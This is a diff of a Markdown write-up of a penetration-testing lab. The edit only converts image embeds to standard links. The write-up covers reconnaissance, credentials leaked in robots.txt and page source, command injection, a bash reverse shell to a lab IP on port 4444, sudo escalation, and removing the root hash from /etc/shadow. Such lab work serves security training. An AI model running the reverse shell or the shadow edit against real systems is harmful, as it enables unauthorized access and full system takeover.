@@ -8,11 +8,11 @@ This lab demonstrates how to exploit a **Remote Code Execution (RCE)** vulnerabi
 
 We began by performing an Nmap scan to identify open ports and available services on the target.
 
-![[Pasted image 20260716155816.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260716155816.png)
 
 To gather more detailed information, we performed service and version detection against the discovered ports.
 
-![[Pasted image 20260716155905.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260716155905.png)
 
 ---
 
@@ -20,11 +20,11 @@ To gather more detailed information, we performed service and version detection 
 
 We used directory fuzzing to discover hidden files and directories exposed by the web server.
 
-![[Pasted image 20260331170016.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260331170016.png)
 
 Next, we repeated the fuzzing process using the **PHP** extension, which revealed a login page.
 
-![[Pasted image 20260716160428.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260716160428.png)
 
 ---
 
@@ -32,15 +32,15 @@ Next, we repeated the fuzzing process using the **PHP** extension, which reveale
 
 We examined the **robots.txt** file and discovered what appeared to be a password.
 
-![[Pasted image 20260716160245.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260716160245.png)
 
 Next, we viewed the source code of the application's homepage and identified a valid username.
 
-![[Pasted image 20260716160620.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260716160620.png)
 
 Using the discovered credentials, we successfully authenticated to the application.
 
-![[Pasted image 20260716160739.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260716160739.png)
 
 ---
 
@@ -48,7 +48,7 @@ Using the discovered credentials, we successfully authenticated to the applicati
 
 After exploring the application, we discovered that one of the input fields was vulnerable to **Command Injection**, allowing operating system commands to be executed on the server.
 
-![[Pasted image 20260716160815.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260716160815.png)
 
 ---
 
@@ -56,7 +56,7 @@ After exploring the application, we discovered that one of the input fields was 
 
 To gain interactive access to the target system, we generated a Bash Reverse Shell payload from **revshells.com**.
 
-![[Pasted image 20260716161118.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260716161118.png)
 
 We slightly modified the payload by prepending `bash -c`, resulting in the following command:
 
@@ -66,11 +66,11 @@ bash -c 'bash -i >& /dev/tcp/192.168.143.146/4444 0>&1'
 
 After executing the payload through the vulnerable input, the server initiated a connection back to our listener.
 
-![[Pasted image 20260716161753.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260716161753.png)
 
 We started a Netcat listener and successfully received a Reverse Shell.
 
-![[Pasted image 20260331170035.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260331170035.png)
 
 ---
 
@@ -82,7 +82,7 @@ To improve usability, we upgraded it to a proper TTY shell using the standard `s
 
 One of the main advantages of upgrading the shell is that keyboard shortcuts such as **Ctrl+C** no longer terminate the shell unexpectedly.
 
-![[Pasted image 20260331170204.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260331170204.png)
 
 ---
 
@@ -96,7 +96,7 @@ sudo -l
 
 This command lists the programs or commands that the current user is allowed to execute with elevated privileges.
 
-![[Pasted image 20260716163033.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260716163033.png)
 
 The output revealed that the current user had unrestricted **sudo** privileges, allowing administrative access to the system.
 
@@ -108,7 +108,7 @@ With elevated privileges, we opened the `/etc/shadow` file.
 
 This file stores the password hashes for all local user accounts and is normally accessible only by the root user.
 
-![[Pasted image 20260716163428.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260716163428.png)
 
 ---
 
@@ -118,7 +118,7 @@ We edited the root user's entry in the shadow file and removed the password hash
 
 As a result, the root account no longer required a password for authentication.
 
-![[Pasted image 20260716163531.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260716163531.png)
 
 ---
 
@@ -126,6 +126,6 @@ As a result, the root account no longer required a password for authentication.
 
 Finally, we switched to the root account without providing a password and obtained full administrative access to the target system.
 
-![[Pasted image 20260716163611.png]]
+![](Penetration%20Testing/Images/Pasted%20image%2020260716163611.png)
 
 The privilege escalation was successful, and we gained a root shell.
